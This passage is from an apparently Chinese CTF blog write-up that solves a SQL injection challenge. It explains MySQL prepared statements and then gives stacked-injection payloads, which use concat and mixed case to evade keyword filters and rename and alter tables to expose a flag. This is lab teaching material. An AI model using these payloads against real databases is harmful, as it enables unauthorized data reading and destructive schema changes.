-<p>首先，使用<code>PREPARE</code>语句准备执行语句。我们使用<code>SELECT</code>语句根据指定的产品代码从<code>products</code>表查询产品数据。然后再使用问号(<code>?</code>)作为产品代码的占位符。</p>
-<p>为了使用MySQL准备语句，您需要使用其他三个MySQL语句如下：</p>
-<ul>
-<li><em>PREPARE</em> - 准备执行的声明。</li>
-<li><em>EXECUTE</em> - 执行由<code>PREPARE</code>语句定义的语句。</li>
-<li><em>DEALLOCATE PREPARE</em> - 发布<code>PREPARE</code>语句。</li>
-</ul>
-<p>接下来，声明了一个产品代码变量<code>@pc</code>，并将其值设置为<code>S10_1678</code>。</p>
-<p>然后，使用<code>EXECUTE</code>语句来执行产品代码变量<code>@pc</code>的准备语句。</p>
-<p>最后，我们使用<code>DEALLOCATE PREPARE</code>来发布<code>PREPARE</code>语句。</p>
-<p>因此这题我们可以这样来进行注入：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;set @sql&#x3D;concat(&#39;sele&#39;,&#39;ct &#96;flag&#96; from &#96;1919810931114514&#96;&#39;);PREPARE stmt1 from @sql;EXECUTE stmt1;</span><br></pre></td></tr></table></figure>
-<p>或者</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#39;;sEt @sql&#x3D;concat(&#39;sele&#39;,&#39;ct * from &#96;1919810931114514&#96;;&#39;);prePare stmt from @sql;EXECUTE stmt;</span><br></pre></td></tr></table></figure>
-<p>注意大小写绕过set和prepare</p>
-<h3 id="方法三：使用rename和alter"><a href="#方法三：使用rename和alter" class="headerlink" title="方法三：使用rename和alter"></a>方法三：使用rename和alter</h3><p>我们使用rename和alter这两个命令来更改表名和字段名。因为我们可以访问words里的columns，发现id，也就是说我们输入的1默认是查询words这个表的。因此我们可以把words表改名成words1表，把1919810931114514表改名成words，然后再把1919810931114514里面的flag字段改名成id，然后输入1’ or 1=1#就可以成功得到flag了。<br> 具体构造如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;rename tables &#96;words&#96; to &#96;words1&#96;;rename tables &#96;1919810931114514&#96; to &#96;words&#96;; alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; varchar(100);</span><br></pre></td></tr></table></figure>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/01/28/web-1/">展开全文 >></a>
         </p>
       
 
